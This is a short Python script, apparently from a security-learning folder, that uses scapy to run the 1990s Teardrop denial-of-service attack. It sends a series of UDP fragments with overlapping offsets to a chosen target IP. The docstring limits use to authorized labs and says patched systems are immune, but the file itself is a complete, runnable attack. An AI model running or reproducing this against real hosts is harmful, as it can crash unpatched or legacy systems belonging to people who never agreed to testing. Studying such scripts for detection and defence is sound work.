#!/usr/bin/env python3
"""Teardrop: overlapping-offset fragmentation DoS demonstration.

EDUCATIONAL / AUTHORIZED-TESTING USE ONLY. Run only inside an isolated lab
network you own, or with explicit written permission. See this folder's
README.md for how the technique works and, more importantly, how to detect
and defend against it.

Teardrop is a 1990s technique; modern, patched operating systems reassemble
fragments defensively and are not vulnerable. This is a legacy learning
exercise, refactored to modern Python 3 for readability.
"""

from __future__ import annotations

from scapy.layers.inet import IP, UDP
from scapy.sendrecv import send

PROTO_UDP = 17
DEST_PORT = 80
PAYLOAD_SIZE = 800
INITIAL_OFFSET = 3
OFFSET_STEP = 20
OVERLAPPING_FRAGMENTS = 10


def teardrop(target_ip: str, interface: str) -> None:
    """Send overlapping-offset UDP fragments toward *target_ip*."""
    print(f"[*] Teardrop demonstration against {target_ip}")
    payload = b"\x00" * PAYLOAD_SIZE
    base = IP(dst=target_ip, flags="MF", proto=PROTO_UDP) / UDP(dport=DEST_PORT)

    send(base / payload, iface=interface, verbose=0)  # first fragment

    offset = INITIAL_OFFSET
    for _ in range(OVERLAPPING_FRAGMENTS):
        base.frag = offset
        send(base / payload, iface=interface, verbose=0)
        offset += OFFSET_STEP

    base.flags = 0            # final fragment clears the "more fragments" flag
    base.frag = offset
    send(base / payload, iface=interface, verbose=0)
